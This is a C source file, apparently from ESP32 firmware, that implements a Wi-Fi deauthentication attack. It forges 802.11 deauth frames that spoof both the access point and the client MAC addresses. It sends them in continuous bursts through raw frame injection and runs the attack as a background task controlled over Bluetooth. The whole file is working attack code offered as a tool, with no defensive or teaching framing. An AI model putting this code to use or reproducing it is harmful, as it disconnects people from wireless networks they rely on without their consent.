#include "classic_deauth.h"

static const char* TAG = "CLASSIC_DEAUTH";

// Wrapper for send_deauth_packets in a task function
static void deauth_task(void *vParameters) {
    // Retrieve targets
    const uint8_t *target_ap = deauth_get_ap_target();
    const uint8_t *target_client = deauth_get_client_target();

    send_deauth_packets(target_ap, target_client);

    deauth_set_task_handle(NULL);
    vTaskDelete(NULL); // Delete this task when done
}


void send_deauth_packets(const uint8_t *ap_mac, const uint8_t *client_mac) {

    // Get attack channel
    int attack_channel = deauth_get_attack_channel();

    ESP_LOGI(TAG, "Sending deauth bursts on channel %d", attack_channel);
    ESP_LOGI(TAG, "AP: %02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    ESP_LOGI(TAG, "Client: %02X:%02X:%02X:%02X:%02X:%02X",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);

    // Prepare WiFi for injection
    prepare_for_injection();

    // Timer
    unsigned long start = esp_timer_get_time() / 1000000;

    // Variables for deauth attack
    uint8_t packet[26];
    esp_err_t ret;
    int total_count = 0;
    int success_count = 0;
    int retry_count = 0;
    const int MAX_RETRIES = 3;
    
    while (deauthActive) {
        // Send burst of 3 packets with retries on failure
        for (int burst = 0; burst < 3; burst++) {
            // ===== AP -> Client deauth =====
            memcpy(packet, deauth_frame, sizeof(deauth_frame));
            memcpy(&packet[4], client_mac, 6); // Destination: CLIENT
            memcpy(&packet[10], ap_mac, 6); // Source: AP
            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
            
            retry_count = 0;
            do {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
                if (ret == ESP_OK) {
                    success_count++;
                    break;
                } else if (ret == ESP_ERR_NO_MEM) {
                    // TX buffer full, wait for it to drain
                    vTaskDelay(pdMS_TO_TICKS(50));
                    retry_count++;
                } else {
                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
                    break;
                }
            } while (retry_count < MAX_RETRIES);
            
            // Small delay between packets in burst
            vTaskDelay(pdMS_TO_TICKS(10));
            
            // ===== Client -> AP deauth =====
            memcpy(&packet[4], ap_mac, 6); // Destination: AP
            memcpy(&packet[10], client_mac, 6); // Source: CLIENT
            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
            
            retry_count = 0;
            do {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
                if (ret == ESP_OK) {
                    success_count++;
                    break;
                } else if (ret == ESP_ERR_NO_MEM) {
                    vTaskDelay(pdMS_TO_TICKS(50));
                    retry_count++;
                } else {
                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
                    break;
                }
            } while (retry_count < MAX_RETRIES);
            
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        // Longer delay between bursts to let buffers clear
        vTaskDelay(pdMS_TO_TICKS(500));
        
        // Log progress every 10 bursts
        if ((total_count + 1) % 10 == 0) {
            // Timer
            unsigned long delay = (esp_timer_get_time() / 1000000) - start;

            // Output
            char result[256];
            snprintf(result, sizeof(result), "LOG|DEAUTH|msg=Progress: %d bursts, %d packets sent (delay=%lus)", total_count + 1, success_count, delay);
            ESP_LOGI(TAG, "Progress: %d bursts, %d packets sent", 
                     total_count + 1, success_count);
            BleManager_SendStatus(result);
        }
        total_count++;
    }

    // Handle attackInProgress variable for blinking
    isAttackActive = false;
    
    ESP_LOGI(TAG, "Attack complete: %d/%d packets sent successfully", 
             success_count, total_count * 6);  // 3 bursts × 2 directions

    
    // Restore original WiFi state
    vTaskDelay(pdMS_TO_TICKS(200));
    restore_wifi_state();
}

void start_deauth_attack(char *target, char *ap, int channel) {
    // Get deauth task handle
    TaskHandle_t deauth_task_handle = deauth_get_task_handle();

    if(deauthActive) {
        ESP_LOGW(TAG, "Deauth already running");
        return;
    }

    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth task already exists");
        return;
    }

    ESP_LOGI(TAG, "DEAUTH target=%s ap=%s ch=%d", target, ap, channel);

    uint8_t target_mac[6];
    uint8_t ap_mac[6];

    if (!mac_str_to_bytes(target, target_mac)) {
        ESP_LOGE(TAG, "Invalid TARGET MAC format");
        //BleManager_SendStatus("DEAUTH_BAD_TARGET_MAC");
        return;
    }

    if (!mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid AP MAC format");
        //BleManager_SendStatus("DEAUTH_BAD_AP_MAC");
        return;
    }

    // set target and AP (target_client, target_ap)
    set_deauth_targets(ap_mac, target_mac);
    // set channel (attack_channel)
    set_deauth_channel(channel);

    deauthActive = true;
    isAttackActive = true;

    // Calling task freeRTOS
    xTaskCreate(
        deauth_task,
        "deauth_task",
        4096,
        NULL,
        5,  // Priority less than ble
        &deauth_task_handle
    );
    
    ESP_LOGI(TAG, "Deauth task created");
}

void stop_deauth_attack() {
    // Get deauth task handle
    TaskHandle_t deauth_task_handle = deauth_get_task_handle();

    if(!deauthActive) return;

    deauthActive = false;

    ESP_LOGI(TAG, "Stopping deauth attack...");
    
    // Wait for task to finish (max 2 seconds)
    int wait_count = 0;
    while (deauth_task_handle != NULL && wait_count < 20) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }
    
    // Force delete if still running
    if (deauth_task_handle != NULL) {
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
        restore_wifi_state();
    }

    ESP_LOGI(TAG, "Deauth STOPPED");
}